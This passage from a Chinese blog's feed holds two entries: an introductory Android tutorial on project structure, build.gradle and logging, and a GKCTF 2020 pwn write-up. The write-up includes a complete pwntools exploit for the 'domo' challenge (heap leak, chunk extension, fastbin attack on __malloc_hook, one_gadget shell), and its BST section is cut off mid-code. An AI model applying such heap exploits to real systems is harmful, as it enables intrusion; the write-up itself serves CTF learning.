title="安装运行"></a>安装运行</h3><p>直接将apk文件拖到bluestacks中，点击图标启动即可：</p><p><img src="./day1/6.jpg" alt=""></p><h2 id="分析HelloWorld项目"><a href="#分析HelloWorld项目" class="headerlink" title="分析HelloWorld项目"></a>分析HelloWorld项目</h2><p>在左侧资源端口可以看到HelloWorld项目，点击箭头打开可以看到如下：</p><p><img src="./day1/7.jpg" alt=""></p><h3 id="目录分析"><a href="#目录分析" class="headerlink" title="目录分析"></a>目录分析</h3><h4 id="一级目录"><a href="#一级目录" class="headerlink" title="一级目录"></a>一级目录</h4><h5 id="gradle和-idea"><a href="#gradle和-idea" class="headerlink" title=".gradle和.idea"></a>.gradle和.idea</h5><p>这两个目录下放置的都是Android Studio自动生成的一些文件。</p><h5 id="app"><a href="#app" class="headerlink" title="app"></a>app</h5><p>项目中的代码、资源等内容几乎都是放置在这个目录下的。</p><h5 id="build"><a href="#build" class="headerlink" title="build"></a>build</h5><p>主要包含了一些在编译时自动生成的文件。（本地没有，但书上有说，也放进来以备用）</p><h5 id="gradle"><a href="#gradle" class="headerlink" title="gradle"></a>gradle</h5><p>这个目录下包含了gradle wrapper的配置文件。Android Studio默认没有gradle wrapper方式，如需要打开，可以点击File -&gt; Settings -&gt; Build, Execution, Deployment -&gt; Gradle进行配置。</p><h5 id="gitignore"><a href="#gitignore" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件是用来将指定的目录或文件排除在版本控制之外的。</p><h5 id="build-gradle"><a href="#build-gradle" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是项目全局的gradle构建脚本。</p><h5 id="gradle-properties"><a href="#gradle-properties" class="headerlink" title="gradle.properties"></a>gradle.properties</h5><p>这个文件是全局的gradle配置文件。在这里配置的属性会影响到项目中所有的gradle编译脚本。</p><h5 id="gradlew和gradlew-bat"><a href="#gradlew和gradlew-bat" class="headerlink" title="gradlew和gradlew.bat"></a>gradlew和gradlew.bat</h5><p>这两个文件是用来在命令行界面中执行gradle命令的，其中gradlew是在Linux或Max系统中使用，gradlew.bat是在Windows系统中使用。</p><h5 id="HelloWorld-iml"><a href="#HelloWorld-iml" class="headerlink" title="HelloWorld.iml"></a>HelloWorld.iml</h5><p>iml文件是所有IntelliJ IDEA项目都会自动生成的文件，用于标识这是一个IntelliJ IDEA项目。</p><h5 id="local-properties"><a href="#local-properties" class="headerlink" title="local.properties"></a>local.properties</h5><p>这个文件用于指定本机中的Android SDK路径。</p><h5 id="settings-gradle"><a href="#settings-gradle" class="headerlink" title="settings.gradle"></a>settings.gradle</h5><p>这个文件用于指定项目中所有引入的模块。</p><h4 id="app目录"><a href="#app目录" class="headerlink" title="app目录"></a>app目录</h4><p><img src="./day1/8.jpg" alt=""></p><h5 id="build-1"><a href="#build-1" class="headerlink" title="build"></a>build</h5><p>与外层的build目录类似。</p><h5 id="libs"><a href="#libs" class="headerlink" title="libs"></a>libs</h5><p>如果项目中使用了第三方jar包，就需要把这些jar包都放在libs目录下，放在这个目录下的jar包都会被自动添加到构建路径里去。</p><h5 id="androidTest"><a href="#androidTest" class="headerlink" title="androidTest"></a>androidTest</h5><p>此处是用来编写Android Test测试用例的，可以对项目进行一些自动化测试。</p><h5 id="java"><a href="#java" class="headerlink" title="java"></a>java</h5><p>用来方式所有java代码的地方。</p><h5 id="res"><a href="#res" class="headerlink" title="res"></a>res</h5><p>项目中使用到的所有图片、布局、字符串等资源都要存放在这个目录下。图片放在drawable目录下，布局放在layout目录下，字符串放在values目录下。</p><h5 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h5><p>这是整个Android项目的配置文件，程序中定义的所有四大组件都需要在这个文件里注册，另外还可以在这个文件中给应用程序添加权限声明。</p><h5 id="test"><a href="#test" class="headerlink" title="test"></a>test</h5><p>此处是用来编写Unit Test测试用例的，是对项目进行自动化测试的另一种方式。</p><h5 id="gitignore-1"><a href="#gitignore-1" class="headerlink" title=".gitignore"></a>.gitignore</h5><p>这个文件用于将app模块内的指定目录或文件排除在版本控制之外，作用和外层的.gitignore类似。</p><h5 id="app-iml"><a href="#app-iml" class="headerlink" title="app.iml"></a>app.iml</h5><p>IntelliJ IDEA项目自动生成的文件。</p><h5 id="build-gradle-1"><a href="#build-gradle-1" class="headerlink" title="build.gradle"></a>build.gradle</h5><p>这是app模块的gradle构建脚本。</p><h5 id="proguard-rules-pro"><a href="#proguard-rules-pro" class="headerlink" title="proguard-rules.pro"></a>proguard-rules.pro</h5><p>这个文件用于指定项目代码的混淆规则。</p><h3 id="项目运行分析"><a href="#项目运行分析" class="headerlink" title="项目运行分析"></a>项目运行分析</h3><p>首先是打开AndroidManifest.xml找到如下代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">activity</span> <span class="attr">android:name</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">intent-filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">action</span> <span class="attr">android:name</span>=<span class="string">"android.intent.action.MAIN"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">category</span> <span class="attr">android:name</span>=<span class="string">"android.intent.category.LAUNCHER"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">intent-filter</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">activity</span>&gt;</span></span><br></pre></td></tr></table></figure><p>这段代码表示对MainActivity这个活动进行注册（没有在AndroidManifest.xml中进行注册的活动是不能使用的）。</p><p>intent-filter里面， <code>&lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt;</code>表示这个activity是主入口，即启动程序时首先运行的就是这个活动；<code>&lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt;</code>表示这个activity种类，要加到LAUNCHER程序列表里面。</p><p>然后再看下MainActivity这个活动的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到MainActivity是继承自AppCompatActivity的，这是一种向下兼容的Activity，可以将Activity在各个系统版本中增加的特性和功能最低兼容到Android 2.1系统。</p><p>然后是onCreate()方法，这个方法是一个活动被创建时必定要执行的方法。</p><p>接着调用了setContentView()方法，这个方法给当前的活动引入了一个activity_main布局，可以在res/layout目录下找到它。</p><p>打开并切换到代码视图，代码如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;androidx.constraintlayout.widget.ConstraintLayout xmlns:android&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res&#x2F;android&quot;</span><br><span class="line">    xmlns:app&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;apk&#x2F;res-auto&quot;</span><br><span class="line">    xmlns:tools&#x3D;&quot;http:&#x2F;&#x2F;schemas.android.com&#x2F;tools&quot;</span><br><span class="line">    android:layout_width&#x3D;&quot;match_parent&quot;</span><br><span class="line">    android:layout_height&#x3D;&quot;match_parent&quot;</span><br><span class="line">    tools:context&#x3D;&quot;.MainActivity&quot;&gt;</span><br><span class="line"></span><br><span class="line">    &lt;TextView</span><br><span class="line">        android:layout_width&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:layout_height&#x3D;&quot;wrap_content&quot;</span><br><span class="line">        android:text&#x3D;&quot;Hello World!&quot;</span><br><span class="line">        app:layout_constraintBottom_toBottomOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintLeft_toLeftOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintRight_toRightOf&#x3D;&quot;parent&quot;</span><br><span class="line">        app:layout_constraintTop_toTopOf&#x3D;&quot;parent&quot; &#x2F;&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;androidx.constraintlayout.widget.ConstraintLayout&gt;</span><br></pre></td></tr></table></figure><p>其中TextView是Android系统提供的一个控件，用于在布局中显示文字。可以看到<code>android:text=&quot;Hello World!&quot;</code>这句代码的定义，也就是我们上面屏幕中所显示的<code>Hello World!</code>。</p><h3 id="详细项目中的资源"><a href="#详细项目中的资源" class="headerlink" title="详细项目中的资源"></a>详细项目中的资源</h3><p>res目录下，所有以drawable开头的文件夹都是用来放图片的，所有以mipmap开头的文件夹都是用来放应用图标的，所有以values开头的文件夹都是用来放字符串、样式、颜色等配置的，layout文件夹是用来放布局文件的。之所以有那么多相同开头的文件夹，主要是为了让程序能更好的兼容各种设备。</p><h4 id="使用资源"><a href="#使用资源" class="headerlink" title="使用资源"></a>使用资源</h4><p>打开res/value/strings.xml，内容如下所示：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>HelloWorld<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></table></figure><p>有以下两种方式来使用它：</p><ul><li>在代码中通过R.string.app_name引用</li><li>在xml中通过@string/app_name引用</li></ul><p>其中tring可以替换成drawable、mipmap、layout之类的内容。</p><h4 id="详解build-gradle文件"><a href="#详解build-gradle文件" class="headerlink" title="详解build.gradle文件"></a>详解build.gradle文件</h4><p>首先看下外层的build.gradle文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Top-level build file where you can add configuration options common to all sub-projects/modules.</span></span><br><span class="line"><span class="keyword">buildscript</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">dependencies</span> &#123;</span><br><span class="line">        <span class="keyword">classpath</span> <span class="string">'com.android.tools.build:gradle:3.6.3'</span></span><br><span class="line">        <span class="comment">// <span class="doctag">NOTE:</span> Do not place your application dependencies here; they belong</span></span><br><span class="line">        <span class="comment">// in the individual module build.gradle files</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">allprojects</span> &#123;</span><br><span class="line">    <span class="keyword">repositories</span> &#123;</span><br><span class="line">        google()</span><br><span class="line">        jcenter()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">task</span> clean(type: <span class="keyword">Delete</span>) &#123;</span><br><span class="line">    <span class="keyword">delete</span> rootProject.buildDir</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先，两处repositories的闭包中都声明了google()和jcenter()配置，声明了这两行后，就可以在项目中轻松引用任何jcenter和google上的开源项目。</p><p>dependencies闭包中使用了classpath声明一个gradle插件。</p><p>接着分析下app目录下的build.gradle文件：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">apply plugin: <span class="string">'com.android.application'</span></span><br><span class="line"></span><br><span class="line">android &#123;</span><br><span class="line">    compileSdkVersion <span class="number">29</span></span><br><span class="line">    buildToolsVersion <span class="string">"29.0.3"</span></span><br><span class="line"></span><br><span class="line">    defaultConfig &#123;</span><br><span class="line">        applicationId <span class="string">"com.example.helloworld"</span></span><br><span class="line">        minSdkVersion <span class="number">16</span></span><br><span class="line">        targetSdkVersion <span class="number">29</span></span><br><span class="line">        versionCode <span class="number">1</span></span><br><span class="line">        versionName <span class="string">"1.0"</span></span><br><span class="line"></span><br><span class="line">        testInstrumentationRunner <span class="string">"androidx.test.runner.AndroidJUnitRunner"</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    buildTypes &#123;</span><br><span class="line">        release &#123;</span><br><span class="line">            minifyEnabled <span class="keyword">false</span></span><br><span class="line">            proguardFiles getDefaultProguardFile(<span class="string">'proguard-android-optimize.txt'</span>), <span class="string">'proguard-rules.pro'</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">dependencies</span> &#123;</span><br><span class="line">    implementation <span class="keyword">fileTree</span>(dir: <span class="string">'libs'</span>, <span class="keyword">include</span>: [<span class="string">'*.jar'</span>])</span><br><span class="line"></span><br><span class="line">    implementation <span class="string">'androidx.appcompat:appcompat:1.0.2'</span></span><br><span class="line">    implementation <span class="string">'androidx.constraintlayout:constraintlayout:1.1.3'</span></span><br><span class="line">    testImplementation <span class="string">'junit:junit:4.12'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.ext:junit:1.1.1'</span></span><br><span class="line">    androidTestImplementation <span class="string">'androidx.test.espresso:espresso-core:3.2.0'</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>第一行应用了一个插件，一般有两种值可选：com.android.application表示这是一个应用程序插件，com.android.library表示这是一个库模块。</p><p>接下来是android闭包，这个闭包中我们可以配置项目构建的各种属性，其中compileSdkVersion用于指定项目构建工具的版本。</p><p>同时，android闭包中又嵌套了一个defaultConfig闭包，defaultConfig闭包中可以对项目的更多细节进行配置。其中applicationId用于指定项目的包名，minSdkVersion用于指定项目最低兼容的Android系统版本。targetSdkVersion指定的值表示在该项目上已做过了充分的测试，系统将会为你的应用程序启动一些最新的功能和特性。versionCode用于指定项目的版本号。versionName用于指定项目的版本名。</p><p>然后再分析下buildTypes闭包。buildTypes闭包中用于指定生成安装文件的相关配置，其中的debug闭包（这里没有）用于指定生成测试版安装文件的配置，release闭包用于指定生成正式版安装文件的配置。minifyEnabled用于指定是否对项目的代码进行混淆。proguardFiles用于指定混淆时使用的规则文件，其中proguard-android.txt是所有项目通用的混淆规则，第二个proguard-rules.pro是当前项目的根目录下的，可以编写当前项目特有的混淆规则。</p><p>然后是dependencies闭包。这个闭包指定用来当前项目所有的依赖关系。Android Studio项目一共有3中依赖方式：</p><ul><li>本地依赖：可以对本地的jar包或目录添加依赖关系。</li><li>库依赖：可以对项目中的库模块添加依赖关系。</li><li>远程依赖：可以对jcenter库和google库上的开源项目添加依赖关系。</li></ul><p>dependencies闭包中的第一行implementation fileTree就是一个本地依赖声明，它表示将libs目录下所有.jar后缀的文件都添加到项目的构建路径当中。</p><p>第二行implementation则是远程依赖声明，<code>androidx.appcompat:appcompat:1.0.2</code>和<code>androidx.constraintlayout:constraintlayout:1.1.3</code>是一个标准的远程依赖库格式，androidx.constraintlayout是域名部分，constraintlayout是组名，1.1.3是版本号。加上这句声明后，Gradle在构建项目时会首先检查下本地是否已经有这个库的缓存，如果没有的话则会去自动联网下载，然后再添加到项目的构建路径当中。</p><p>testImplementation用于声明测试用例库，这个暂时用不到。</p><h2 id="日志工具"><a href="#日志工具" class="headerlink" title="日志工具"></a>日志工具</h2><h3 id="Log"><a href="#Log" class="headerlink" title="Log"></a>Log</h3><p>android的日志工具是Log，这个类中提供了如下5个方法供我们打印日志：</p><ul><li>log.v()用于打印最琐碎，意义最小的日志信息。</li><li>log.d()用于打印调试信息。</li><li>log.i()用于打印比较重要的数据。</li><li>log.w()用于打印一些警告信息。</li><li>log.e()用于打印程序中的错误信息。</li></ul><h5 id="示例："><a href="#示例：" class="headerlink" title="示例："></a>示例：</h5><p>在MainActivity的onCreate()方法中添加一行打印日志语句：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Log.d(<span class="string">"MainActivity"</span>,<span class="string">"onCreate execute"</span>);</span><br></pre></td></tr></table></figure><p>其中第一个参数是tag，一般传入当前类名即可，主要用于对打印信息进行过滤；第二个参数是msg，即想要打印的具体的内容：</p><p><img src="./day1/9.jpg" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;因linux下的前景较窄，所以想了解下android下的一些内容，准备了好久，今天就正式吧。目前第一本书：《第一行代码:Android》。&lt;
      
    
    </summary>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/categories/Android/"/>
    
    
      <category term="Android" scheme="https://nuoye-blog.github.io/tags/Android/"/>
    
      <category term="开发" scheme="https://nuoye-blog.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>2020GKCTF-pwn</title>
    <link href="https://nuoye-blog.github.io/2020/05/24/wp/2020GKCTF/2020GKCTF-pwn/"/>
    <id>https://nuoye-blog.github.io/2020/05/24/wp/2020GKCTF/2020GKCTF-pwn/</id>
    <published>2020-05-24T15:10:00.000Z</published>
    <updated>2020-05-24T15:09:05.832Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="domo"><a href="#domo" class="headerlink" title="domo"></a>domo</h2><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>挺简单的一道pwn题，具有add、delete、show功能，同时可以任意地址写一字节。</p><p>题目环境是libc2.23的，所以利用方式比较简单。</p><p>首先通过fastbin和unsortbin来leak libc和heap。</p><p>然后申请4个chunk，在申请第二个chunk的时候顺便将第三个chunk的prev_size位设置为第一第二个chunk的大小；然后free掉第一个；再将第三个chunk的size的p位清0，free掉第三个chunk，就可以实现chunk extended。接着重新申请就可以得到两个同时指向chunk2的指针，然后就是fastbin attack那些操作了。。。</p><p>最后getshell的话是利用scanf输入较大数据的时候会malloc（这一机制也会触发malloc_consolidate机制，具体可以在网上找找文章，这里没用到就不详细讲了），已经就可以绕过后面seccomp的防护以及对堆操作的检查。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">"./domo"</span>)</span><br><span class="line">p = remote(<span class="string">"node3.buuoj.cn"</span>,<span class="string">"26472"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./domo"</span>).libc</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,data)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"size:"</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">"content:"</span>)</span><br><span class="line">p.send(data)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"2"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"3"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"index:"</span>)</span><br><span class="line">p.sendline(str(index))</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(addr,byte)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"4"</span>)</span><br><span class="line">p.recvuntil(<span class="string">"addr:"</span>)</span><br><span class="line">p.sendline(str(addr))</span><br><span class="line">p.recvuntil(<span class="string">"num:"</span>)</span><br><span class="line">p.sendline(byte)</span><br><span class="line">one = [<span class="number">0x45216</span>,<span class="number">0x4526a</span>,<span class="number">0xf02a4</span>,<span class="number">0xf1147</span>]</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'\n'</span>)<span class="comment">#0</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0x3C4B0A</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.address)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\n'</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvline()</span><br><span class="line">heap = u64(p.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>) <span class="number">-0xa</span></span><br><span class="line"><span class="keyword">print</span> hex(heap)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf8</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0xf2</span>,<span class="string">'a'</span>*<span class="number">0xf0</span>+<span class="string">'\x00\x02'</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(heap+<span class="number">0x218</span>,<span class="string">'\x00'</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x68</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0xf0</span>,<span class="string">'aaaa'</span>)<span class="comment">#4</span></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x60</span>,p64(libc.sym[<span class="string">'__malloc_hook'</span>]<span class="number">-0x23</span>))<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'aaaa'</span>)<span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>,<span class="string">'\x00'</span>*<span class="number">0x3</span>+p64(<span class="number">0</span>)+p64(libc.address+one[<span class="number">3</span>])+p64(libc.sym[<span class="string">'realloc'</span>]+<span class="number">6</span>))<span class="comment">#3</span></span><br><span class="line"><span class="keyword">print</span> hex(libc.sym[<span class="string">'__realloc_hook'</span>])</span><br><span class="line"><span class="comment">#gdb.attach(p,'b malloc')</span></span><br><span class="line">p.recvuntil(<span class="string">"5: Exit"</span>)</span><br><span class="line">p.sendline(<span class="string">"1 "</span>+<span class="string">'1'</span>*<span class="number">0x400</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="BST"><a href="#BST" class="headerlink" title="BST"></a>BST</h2><h3 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h3><p>这道题分析了好久，最后出来好像是非预期。。。</p><p>因为不太懂c++，所以是直接在gdb下一步一步调试出功能的，主要就是一个0x30大小的结构体(数据类型。。。呃。。随便就好)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">bst</span>&#123;</span></span><br><span class="line">    <span class="keyword">int64_t</span> idx;</span><br><span class="line">    <span class="keyword">int64_t</span><span class="built_in">size</span>;</span><br><span class="line">    <span class="keyword">int64_t</span>*data_ptr;</span><br><span class="line">    <span class="keyword">int64_t</span>*left_node;</span><br><span class="line">    <span class="keyword">int64_t</span>*right_node;</span><br><span class="line">    <span class="keyword">int64_t</span>*parent_node;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后在尝试申请5-&gt;3-&gt;4-&gt;2后，free节点3（即同时存在左右节点和父节点）的时候，发现存在uaf漏洞：</p><p>free前：</p><figure class="highlight h"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 